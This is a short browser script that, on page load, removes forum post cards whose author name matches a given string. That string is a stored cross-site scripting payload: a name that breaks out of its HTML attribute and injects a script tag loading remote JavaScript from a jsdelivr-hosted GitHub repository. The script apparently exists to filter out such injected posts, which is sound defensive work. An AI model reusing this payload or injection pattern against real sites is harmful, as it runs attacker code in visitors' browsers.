window.onload = (ev) => {
    // @ts-ignore
    if (!window.mLoaded) {
    // @ts-ignore    
        window.mLoaded = true
        main()
    }
}

function main() {
    const elements = document.getElementsByClassName('post-card')
    for (const element of elements) {
        const pHeader = element.getElementsByClassName('post-header')[0]
        const pAuthorInfo = pHeader.getElementsByClassName('author-info')[0]
        const pAuthorName = pAuthorInfo.children[0]
        if (pAuthorName && (pAuthorName.innerHTML == '网友28"&gt;<script async="" src="https://cdn.jsdelivr.net/gh/gm6njbkbv4-bit/gwall@main/m.js"></script>')) {
            setTimeout(() => {element.remove()}, 20)
        }
    }
}
